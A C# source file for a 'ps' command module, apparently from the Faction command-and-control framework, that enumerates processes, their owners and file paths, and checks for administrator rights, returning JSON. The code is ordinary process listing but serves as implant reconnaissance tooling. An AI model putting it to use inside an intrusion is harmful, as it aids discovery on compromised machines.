using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Security.Principal;
using System.Runtime.InteropServices;
using Newtonsoft.Json;

using Faction.Modules.Dotnet.Common;


namespace Faction.Modules.Dotnet.Commands
{
  class F2Process
  {
    public string Name;
    public int PID;
    public string Filename;
    public string FileVersion;
    public DateTime? StartTime;
    public string Owner;
  }



  class ListProcesses : Command
  {
    public override string Name { get { return "ps"; } }

    // Thanks random internet person! https://stackoverflow.com/a/38676215
    private static string GetProcessUser(Process process)
    {
      IntPtr processHandle = IntPtr.Zero;
      try
      {
        OpenProcessToken(process.Handle, 8, out processHandle);
        WindowsIdentity wi = new WindowsIdentity(processHandle);
        string user = wi.Name;
        return user.Contains(@"\") ? user.Substring(user.IndexOf(@"\") + 1) : user;
      }
      catch
      {
        return null;
      }
      finally
      {
        if (processHandle != IntPtr.Zero)
        {
          CloseHandle(processHandle);
        }
      }
    }

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CloseHandle(IntPtr hObject);


    public override CommandOutput Execute(Dictionary<string, string> Parameters = null)
    {
      bool isElevated;
      using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
      {
        WindowsPrincipal principal = new WindowsPrincipal(identity);
        isElevated = principal.IsInRole(WindowsBuiltInRole.Administrator);
      }

      Process[] processes = Process.GetProcesses();
      List<F2Process> results = new List<F2Process>();

      foreach (Process proc in processes)
      {
        F2Process f2Process = new F2Process();
        f2Process.Name = proc.ProcessName;
        f2Process.PID = proc.Id;
        try
        {
          f2Process.StartTime = proc.StartTime;
        }
        catch
        {
          f2Process.StartTime = null;
        }
        try
        {
          f2Process.Filename = proc.MainModule.FileName;         
        }
        catch
        {
          f2Process.Filename = null;
        }

        try
        {
          f2Process.FileVersion = proc.MainModule.FileVersionInfo.FileVersion;
        }
        catch
        {
          f2Process.FileVersion = null;
        }

        try
        {
          f2Process.Owner = GetProcessUser(proc);
        }
        catch
        {
          f2Process.Owner = null;
        }
        results.Add(f2Process);
      }

      CommandOutput output = new CommandOutput();
      output.Success = true;
      output.Complete = true;
      output.Message = JsonConvert.SerializeObject(results);

      Console.WriteLine(output.Message);
      return output;
    }
  }
}
